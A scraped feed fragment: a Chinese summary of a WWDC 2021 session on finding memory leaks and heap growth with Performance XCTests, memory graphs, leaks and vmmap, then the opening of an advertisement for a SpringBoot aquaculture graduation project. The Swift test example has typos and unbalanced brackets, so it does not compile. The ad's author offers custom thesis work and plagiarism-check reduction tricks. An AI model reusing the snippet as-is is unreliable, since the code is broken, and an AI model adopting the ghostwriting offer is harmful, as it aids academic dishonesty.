.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/" ref="nofollow noopener noreferrer">developer.apple.com/videos/play…</a></p>
<h2 data-id="heading-0">概述</h2>
<p>本Session主要解释了App内存由哪些部分组成，并介绍了可以使用Performace XCTests工具对内存问题进行排查、分析</p>
<h2 data-id="heading-1">Impact of Memory footprint</h2>
<p>好的内存管理可以提升用户体验，可以表现在</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e318640848844cd09c97d57606693a9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=N2K9ucCz3r6rB9SsUCxAks11YO8%3D" alt="" loading="lazy"/></p>
<ol>
<li>Faster application activation，因为内存控制的好，所以app进入后台时不易被系统终止，重新激活回到前台时也更快</li>
<li>Responsive experience，更高的响应速度</li>
<li>Complex workflows，内存控制的好则意味着可以增加更多更消耗内存的功能</li>
<li>Wider device compatibility，控制好内存则可以兼容到更老的机器</li>
</ol>
<h2 data-id="heading-2">Memory footprint</h2>
<p>本小节主要介绍Memory footprint都是有哪些内容组成</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae2656d9f2a34deaaa2680b4e29d5808~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=EEF1620%2Fr98jqssruvxbMrmOoNg%3D" alt="" loading="lazy"/></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F%3Ftime%3D151" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/?time=151" ref="nofollow noopener noreferrer">Dirty memory consists of memory written by your application. </a><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F%3Ftime%3D155" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/?time=155" ref="nofollow noopener noreferrer">It also includes all heap allocations </a><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F%3Ftime%3D158" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/?time=158" ref="nofollow noopener noreferrer">such as when you use malloc, decoded image buffers, </a><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F%3Ftime%3D161" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/?time=161" ref="nofollow noopener noreferrer">and frameworks.</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b414cb8b3be4125a8174b5de7130d27~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=PA1bDhSb9K9jjYIAAWGfo7j%2BHUQ%3D" alt="" loading="lazy"/></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F%3Ftime%3D164" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/?time=164" ref="nofollow noopener noreferrer">Compressed memory refers to any dirty pages </a><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F%3Ftime%3D167" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/?time=167" ref="nofollow noopener noreferrer">that haven't recently been accessed </a><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F%3Ftime%3D169" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/?time=169" ref="nofollow noopener noreferrer">that the memory compressor has compressed. </a><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10180%2F%3Ftime%3D172" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10180/?time=172" ref="nofollow noopener noreferrer">These pages will be decompressed on access.</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db0b1f4cfd1d427ba70fb7b64fe416b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=S5%2FqfUsuSxFiH4krAx6NS3Ym9eU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">Tools for profiling memory</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ef50099abc741afafb7ab55379d1d5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=Lgsn%2B0Yj9eEI4VlEn9fIdwhc9cg%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">Performance XCTests</h3>
<p>可以使用XCTests去检查各个功能的性能表现，比如</p>
<ul>
<li>Memory utilization，内存利用情况</li>
<li>CPU usage</li>
<li>Disk writes</li>
<li>Hitch rate，卡顿率</li>
<li>Wall clock time，功能的耗时情况</li>
<li>Application launch time</li>
</ul>
<h4 data-id="heading-5">Memory utilization 示例</h4>
<pre><code class="hljs language-scss" lang="scss">func <span class="hljs-built_in">testSaveMeal</span>() {
    let app = <span class="hljs-built_in">XCUIApplication</span>()
    let options = <span class="hljs-built_in">XCTMeasureOptions</span>()
    options<span class="hljs-selector-class">.invocationOptions</span> = <span class="hljs-selector-attr">[.manuallyStart]</span>
    <span class="hljs-built_in">measure</span>(metrics: [XCTMemoryMetric(application: aapp)<span class="hljs-number">1</span>
        options: options) {
        app<span class="hljs-selector-class">.launch</span>()
        <span class="hljs-built_in">startMeasuring</span>()
        app<span class="hljs-selector-class">.cells</span><span class="hljs-selector-class">.firstMatch</span><span class="hljs-selector-class">.buttons</span><span class="hljs-selector-attr">[<span class="hljs-string">"Save meal"</span>]</span><span class="hljs-selector-class">.firstMatch</span><span class="hljs-selector-class">.tap</span>()
        let savedButton = app<span class="hljs-selector-class">.cells</span><span class="hljs-selector-class">.firstMatch</span><span class="hljs-selector-class">.buttons</span><span class="hljs-selector-attr">[<span class="hljs-string">"Saved"</span>]</span><span class="hljs-selector-class">.firstMatch</span>
        XCTAssertTrue (savedButton.waitForExistendce(timeout: <span class="hljs-number">30</span>)
    }
}
</code></pre>
<p>上述代码检测的是点击“Save meal”按钮后内存的变化情况，变化情况如下图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19da0bfded9d4c89bdf48f4c8de680ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=fxTIQK5ANGh9N1agI0WgcUgVFD8%3D" alt="" loading="lazy"/></p>
<ol>
<li>Metric项可以选择不同的内存检测指标，如内存峰值还是普通内存值</li>
<li>底部柱状图表示是多次执行的情况</li>
<li>Average项表示的是所选Metric的均值情况</li>
<li>Baseline、Max STDDEV(最大标准差)则可以用来设置检测基线和上下浮动阈值</li>
<li>当检测结束后，可以通过Result查看本次检测结果变好了还是变差了</li>
</ol>
<h4 data-id="heading-6">Diagnostic collection</h4>
<p>Xcode 13中引入了两个有力的诊断数据Ktrace files和Memory graphs</p>
<p>执行Performance XCTests时可以开启他们</p>
<h5 data-id="heading-7">Ktrace files</h5>
<p>是一种专用的文件类型，用于分析卡顿问题，可以用Instrument直接打开</p>
<p>详情可以参考</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2019%2F411%2F" target="_blank" title="https://developer.apple.com/videos/play/wwdc2019/411/" ref="nofollow noopener noreferrer">Getting Started with Instruments</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2021%2F10258%2F" target="_blank" title="https://developer.apple.com/videos/play/wwdc2021/10258/" ref="nofollow noopener noreferrer">Understand and eliminate hangs from your app</a></li>
</ul>
<h5 data-id="heading-8">Memory graphs</h5>
<p>某一时刻，App内存中所有对象及引用关系数据</p>
<ul>
<li>在日常使用Xcode debug App时，我们也能看到内置的Memory graphs功能</li>
<li>下图为运行完XCTests后，结果中Memory graphs文件，也可以单独进行分析</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/089116f2d5b84de0991dbaf071e7ebc6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=uIh0zTXsp78E284cYAHrikWxCCQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">Types of memory issues</h2>
<p>内存问题类型有多种，本session中会介绍到Leaks（内存泄漏）和Heap size issues</p>
<h3 data-id="heading-10">Leaks</h3>
<p>对于内存泄漏问题，可以使用<code>leaks</code>命令对钱文忠的Memory graphs文件进行分析，查找泄漏的代码堆栈、是否存在循环引用</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f16fdcfd9db34262b3cdd633ccfa5806~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=d%2BWCKQOozPVhwqhhSFF7%2F1WUyFw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-11">Heap size issues</h3>
<h4 data-id="heading-12">Heap allocations regressions</h4>
<p>堆内存占用的劣化问题</p>
<p>为减少使用堆内存开辟空间导致内存占用劣化，我们可以这样做：</p>
<ul>
<li>Remove unused allocations</li>
<li>Shrink overly large allocations</li>
<li>Deallocated memory you are finished with</li>
<li>Wait to allocate memory until you need it</li>
</ul>
<p>Session中提到，官方提供了如<code>vmmap</code>等一系列命令对前面生成的Memory graphs文件分析</p>
<h4 data-id="heading-13">Fragmentation</h4>
<p>Fragmentation译为碎片化</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58b333abcdfd4de5b237790122abe4f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=PfE33yDhxD0EqlNEg9l11I3RkLk%3D" alt="" loading="lazy"/></p>
<p>如何可以减少碎片化</p>
<ul>
<li>Allocate objects with similar lifetimes close to each other</li>
<li>Aim for 25% fragmentation</li>
<li>Use autorelease pools</li>
<li>Pay extra attention to long running processes</li>
<li>Use allocations track in Instruments</li>
</ul>
<p>也可以使用<code>vmmap</code>等命令查看碎片比例</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3b7c06db7044e77957820a11bf70368~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=ahMRnfiNgnaWl6gbn4Idap3EpmI%3D" alt="" loading="lazy"/></p>
<ul>
<li>上图中FRAG是碎片比例</li>
<li>DIRTY SIZE表示碎片化导致的Dirty pages情况</li>
<li>DIRTY+SWAP FRAG SIZE表示的是碎片空间大小</li>
</ul>
<h2 data-id="heading-14">总结</h2>
<p>总结一下官方推荐的检测、诊断内存问题的最佳实践</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/deb7a70b74e8474696470073313fb2b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=upICJhqYE8vy8SykTv3KJ3KQsyQ%3D" alt="" loading="lazy"/></p>
<p>第一步：先是检测</p>
<ol>
<li>针对业务功能/场景编写Performance XCTests</li>
<li>设置baseline（基线）进行测试</li>
<li>如果发现有regression（劣化），则收集诊断数据（Memory graphs or Ktrace）</li>
</ol>
<p>第二步：诊断</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c089bf6b1af413f98093f85c7199723~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc29uZ2dlYg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764476705&amp;x-signature=%2B67eU1bNOvWz%2FjEXL61eh5W8l20%3D" alt="" loading="lazy"/></p>
<ol>
<li>检查最易发现的内存泄漏</li>
<li>再使用各种命令查看是否有堆内存劣化</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[计算机毕业设计推荐：基于SpringBoot的水产养殖管理系统【Java+spring boot+MySQL、Java项目、Java毕设、Java项目定制定做】]]></title>    <link>https://juejin.cn/post/7575090551357390900</link>    <guid>https://juejin.cn/post/7575090551357390900</guid>    <pubDate>2025-11-23T04:50:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575090551357390900" data-draft-id="7575162322239717376" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="计算机毕业设计推荐：基于SpringBoot的水产养殖管理系统【Java+spring boot+MySQL、Java项目、Java毕设、Java项目定制定做】"/> <meta itemprop="keywords" content="Java,Spring Boot,MySQL"/> <meta itemprop="datePublished" content="2025-11-23T04:50:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="计算机毕业设计小途"/> <meta itemprop="url" content="https://juejin.cn/user/3344059640330504"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            计算机毕业设计推荐：基于SpringBoot的水产养殖管理系统【Java+spring boot+MySQL、Java项目、Java毕设、Java项目定制定做】
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3344059640330504/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    计算机毕业设计小途
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T04:50:45.000Z" title="Sun Nov 23 2025 04:50:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>💖💖作者：计算机毕业设计小途
💙💙个人简介：曾长期从事计算机专业培训教学，本人也热爱上课教学，语言擅长Java、微信小程序、Python、Golang、安卓Android等，开发项目包括大数据、深度学习、网站、小程序、安卓、算法。平常会做一些项目定制化开发、代码讲解、答辩教学、文档编写、也懂一些降重方面的技巧。平常喜欢分享一些自己开发中遇到的问题的解决办法，也喜欢交流技术，大家有技术代码这一块的问题可以问我！
💛💛想说的话：感谢大家的关注与支持！
💜💜
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2501_92808674%2Fcategory_13011385.html" target="_blank" title="https://blog.csdn.net/2501_92808674/category_13011385.html" ref="nofollow noopener noreferrer">网站实战项目</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2501_92808674%2Fcategory_13011386.html" target="_blank" title="https://blog.csdn.net/2501_92808674/category_13011386.html" ref="nofollow noopener noreferrer">安卓/小程序实战项目</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2501_92808674%2Fcategory_13011387.html" target="_blank" title="https://blog.csdn.net/2501_92808674/category_13011387.html" ref="nofollow noopener noreferrer">大数据实战项目</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2501_92808674%2Fcategory_13011390.html%3Fspm%3D1001.2014.3001.5482" target="_blank" title="https://blog.csdn.net/2501_92808674/category_13011390.html?spm=1001.2014.3001.5482" ref="nofollow noopener noreferrer">深度学习实战项目</a></p>
</blockquote>
<p>@<a href="https://link.juejin.cn?target=%25E7%259B%25AE%25E5%25BD%2595" target="_blank" title="%E7%9B%AE%E5%BD%95" ref="nofollow noopener noreferrer">TOC</a></p>
<h2 data-id="heading-0">基于SpringBoot的水产养殖管理系统介绍</h2>
<p>本系统命名为《基于SpringBoot的水产养殖管理系统》，旨在通过信息化手段全面提升水产养殖行业的现代化管理水平。该系统采用B/S（Browser/Server）架构，核心技术栈强大且灵活。在后端，系统主要基于Java语言开发，并深度整合了Spring Boot框架，充分利用了Spring的依赖注入、Spring MVC的请求处理能力以及MyBatis的持久层操作，实现了高效稳定的业务逻辑处理；同时，系统也提供了Python语言版本，基于Django框架实现，为用户提供了多样化的技术选择。前端界面则由Vue.js框架配合ElementUI组件库及HTML技术构建，确保了用户界面的响应式、交互性和美观性，为用户提供流畅的操作体验。数据存储方面，系统选择成熟稳定的MySQL数据库，确保了数据的高效存取与管理。开发工具推荐使用IntelliJ IDEA进行Java版本开发，或PyCharm进行Python版本开发。系统功能模块设计周密，涵盖了水产养殖管理的各个核心环节，包括用户管理、水产种类管理、水产信息管理、水产产地管理以及至关重要的水产订单管理，构建了从生产到销售的完整链条。此外，系统还具备详细的养殖记录管理功能，方便用户追溯与分析；通过饲料信息管理、采购入库管理与出库信息管理，实现了对养殖物资的精细化管控。为了提升养殖技能与知识水平，系统特别集成了养殖培训管理、培训类型管理及培训报名管理模块，为养殖户提供学习交流平台。在平台运营层面，系统提供了直观的系统首页、个性化的个人中心、全面的系统管理功能、公告资讯分类与轮播图管理，确保了平台的信息发布与日常运维。智能客服模块的引入，旨在提升用户服务效率与体验；详尽的系统日志功能则保障了系统的可追溯性和安全性。通过这些模块的有机结合，本系统致力于为水产养殖企业提供一个集约化、智能化、数据化的综合管理解决方案，助力行业实现可持续发展和效率飞跃。</p>
<h2 data-id="heading-1">基于SpringBoot的水产养殖管理系统演示视频</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1JAUNBiEzS%2F%3Fspm_id_from%3D333.1387.homepage.video_card.click" target="_blank" title="https://www.bilibili.com/video/BV1JAUNBiEzS/?spm_id_from=333.1387.homepage.video_card.click" ref="nofollow noopener noreferrer">演示视频</a></p>
<h2 data-id="heading-2">基于SpringBoot的水产养殖管理系统演示图片</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18ee925be93d4aa7b85b4ffd663d41f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=ecU5OqgjJfIg4ulFcY%2B6dTP83Oo%3D" alt="采购入库.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc60bb5db3394ade96aeaeab856654e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=hPce7eAqkQ%2Bh7D1rRMaUFPNYPZg%3D" alt="出库信息.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bcf55771f8f450f92e57e5e12934cea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=yyVNqCzfAPoFenA6tQsoX%2B8XL%2Fs%3D" alt="培训报名.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75ce0e78b1e74fdca8e931b12879a44c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=uo3cj6p6ezGJjvnAJ2BjGS3V7j0%3D" alt="水产订单.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ccb25cc9882e45d09dbabae20605c402~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=Cw0UVocsVKQ0pDq23Q9v0K3gb%2FU%3D" alt="水产信息.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3ecb866651445729998fe42b2c8a935~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=4MZE50OTOCEJ2ZqbuBLaCCbuLu4%3D" alt="饲料信息.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e206bfe1eb754d15bb25e690a6444d71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=ZwifH3Yzcok0yplnNvAht7QLv54%3D" alt="养殖记录.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/096d8b54b7584e38b24bc1b417018a89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=IyiUr%2BEyIGc%2B8RMqRpF5yJkqJIU%3D" alt="养殖培训.png" loading="lazy"/></p>
